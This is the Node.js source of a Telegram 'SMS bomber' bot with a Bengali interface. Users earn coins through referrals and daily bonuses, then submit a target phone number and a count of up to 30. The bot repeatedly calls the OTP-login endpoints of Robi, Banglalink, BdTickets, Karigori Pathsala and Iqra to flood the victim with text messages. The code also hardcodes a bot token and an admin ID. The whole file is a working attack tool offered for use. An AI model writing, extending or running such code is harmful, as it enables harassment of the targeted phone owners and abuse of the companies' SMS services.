const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const http = require('http');

// --- কনফিগারেশন ---
const token = '8784762504:AAH4uP_glf7oKo52fiUiInsxOYheI0Mm-U8';
const adminId = '7225943533'; 
const channelId = '@srmtelecom'; 
const channelLink = 'https://t.me/srmtelecom';
const bot = new TelegramBot(token, {polling: true});

// ডাটাবেস হ্যান্ডলিং
const dbFile = 'users.json';
let users = {};
if (fs.existsSync(dbFile)) { 
    try { users = JSON.parse(fs.readFileSync(dbFile)); } catch (e) { users = {}; }
}
function saveDB() { fs.writeFileSync(dbFile, JSON.stringify(users, null, 2)); }

// Render সার্ভার (বট ২৪ ঘণ্টা সচল রাখতে)
http.createServer((req, res) => { res.write("S.R.M Ultimate Engine is Online!"); res.end(); }).listen(process.env.PORT || 3000);

console.log("🚀 S.R.M TELECOM (All Power APIs) চালু হয়েছে...");

const mainMenu = {
    reply_markup: {
        keyboard: [
            [{ text: '🚀 শুরু করুন (Attack)' }, { text: '💰 প্রোফাইল ও কয়েন' }],
            [{ text: '🎁 ডেইলি বোনাস' }, { text: '🔗 রেফার করুন' }],
            [{ text: '📢 চ্যানেল' }]
        ],
        resize_keyboard: true
    }
};

async function isSubscribed(chatId) {
    try {
        const res = await bot.getChatMember(channelId, chatId);
        return ['member', 'administrator', 'creator'].includes(res.status);
    } catch (e) { return false; }
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const userId = msg.from.id.toString();
    if (!text) return;

    // ১. ইউজার ডাটা ও রেফারাল লজিক
    if (!users[userId]) {
        users[userId] = { balance: 0, lastBonus: 0, step: '', name: msg.from.first_name || "User" };
        if (text.startsWith('/start ') && text.split(' ')[1] !== userId) {
            const refId = text.split(' ')[1];
            if (users[refId]) {
                users[refId].balance += 1;
                bot.sendMessage(refId, `🎊 অভিনন্দন! আপনার রেফারে একজন জয়েন করায় আপনি **১ কয়েন** পেয়েছেন।`);
            }
        }
        saveDB();
    }

    // ২. ফোর্স জয়েন চেক
    const joined = await isSubscribed(chatId);
    if (!joined && text !== '/start' && !text.startsWith('/start')) {
        return bot.sendMessage(chatId, `❌ **অ্যাক্সেস লক!**\n\nবটটি ব্যবহার করতে আমাদের চ্যানেলে জয়েন করুন।\n📢 লিংক: ${channelLink}\n\nজয়েন করে আবার /start দিন।`);
    }

    // ৩. অ্যাডমিন কন্ট্রোল
    if (userId === adminId) {
        if (text.startsWith('add ')) {
            const [_, targetId, amount] = text.split(' ');
            if (users[targetId]) {
                users[targetId].balance += parseInt(amount);
                saveDB();
                bot.sendMessage(chatId, `✅ ইউজার ${targetId}-কে ${amount} কয়েন দেওয়া হয়েছে।`);
            }
            return;
        }
    }

    // ৪. মেনু ফাংশনস
    if (text === '/start' || text.startsWith('/start')) {
        return bot.sendMessage(chatId, "🔥 **S.R.M TELECOM**\nসবচেয়ে শক্তিশালী ওটিপি সার্ভিস। প্রতি অ্যাটাকে ১ কয়েন কাটবে।", mainMenu);
    }

    if (text === '💰 প্রোফাইল ও কয়েন') {
        const bal = (userId === adminId) ? "Unlimited ♾" : users[userId].balance;
        return bot.sendMessage(chatId, `👤 নাম: ${users[userId].name}\n🆔 আইডি: \`${userId}\`\n💰 ব্যালেন্স: ${bal}`, { parse_mode: "Markdown" });
    }

    if (text === '🎁 ডেইলি বোনাস') {
        const now = Date.now();
        if (now - users[userId].lastBonus < 86400000) return bot.sendMessage(chatId, "⏳ ২৪ ঘণ্টা পর আবার বোনাস নিতে পারবেন।");
        users[userId].balance += 2;
        users[userId].lastBonus = now;
        saveDB();
        return bot.sendMessage(chatId, "✅ আপনি **২ কয়েন** ডেইলি বোনাস পেয়েছেন!");
    }

    if (text === '🔗 রেফার করুন') {
        const refLink = `https://t.me/reffer_incomebdbot?start=${userId}`; 
        return bot.sendMessage(chatId, `🔗 **আপনার রেফার লিঙ্ক:**\n${refLink}\n\nপ্রতি রেফারে পাবেন **১ কয়েন**!`);
    }

    // ৫. অ্যাটাক প্রসেস (Robi + BdTickets + Karigori + Others)
    if (text === '🚀 শুরু করুন (Attack)') {
        if (userId !== adminId && users[userId].balance < 1) return bot.sendMessage(chatId, "❌ ব্যালেন্স নেই! বোনাস নিন।");
        users[userId].step = 'num';
        saveDB();
        return bot.sendMessage(chatId, "📱 টার্গেট নম্বর দিন (১১ ডিজিট):", { reply_markup: { remove_keyboard: true } });
    }

    if (users[userId]?.step === 'num' && text.length === 11) {
        users[userId].target = text;
        users[userId].step = 'amount';
        saveDB();
        return bot.sendMessage(chatId, "🔢 কয়টি SMS? (১-৩০):");
    }

    if (users[userId]?.step === 'amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount > 30) return bot.sendMessage(chatId, "⚠️ সর্বোচ্চ ৩০টি দিন।");
        const target = users[userId].target;
        if (userId !== adminId) users[userId].balance -= 1;
        users[userId].step = '';
        saveDB();

        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে বোমা ফাটানো শুরু হচ্ছে...`, mainMenu);

        let success = 0;
        for (let i = 0; i < amount; i++) {
            // ১. Robi (Next.js Pro Headers & Array Body)
            try { 
                await axios.post('https://www.robi.com.bd/api/v1/user/otp-login/request', [{"msisdn": target}], { 
                    headers: { 'Accept': 'text/x-component', 'next-action': '7f059ca75e4421bcef70abad89cb5bb05cba717c30', 'X-Requested-With': 'mark.via.gp' }, timeout: 4000 
                }); success++;
            } catch (e) {}

            // ২. BdTickets (Original Body - Port 20100)
            try { 
                await axios.post('https://api.bdtickets.com:20100/v1/auth', { "createUserCheck": true, "phoneNumber": "+88" + target, "applicationChannel": "WEB_APP" }, { timeout: 4000 }); success++;
            } catch (e) {}

            // ৩. Karigori Pathsala (OPTIONS Method)
            try { 
                await axios.options(`https://api.karigoripathsala.com/api/get-otp?phone=${target}`);
                await axios.get(`https://api.karigoripathsala.com/api/get-otp?phone=${target}`);
                success++;
            } catch (e) {}

            // ৪. Banglalink & Iqra
            try { await axios.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', { mobile: target }); success++; } catch (e) {}
            try { await axios.get(`https://apibeta.iqra-live.com/api/v2/sent-otp/${target}`); success++; } catch (e) {}

            await new Promise(r => setTimeout(r, 4500)); 
        }
        bot.sendMessage(chatId, `✅ মিশন সম্পন্ন!\n🎯 টার্গেট: ${target}\n📤 মোট হিট: ${success}টি`, mainMenu);
    }
});
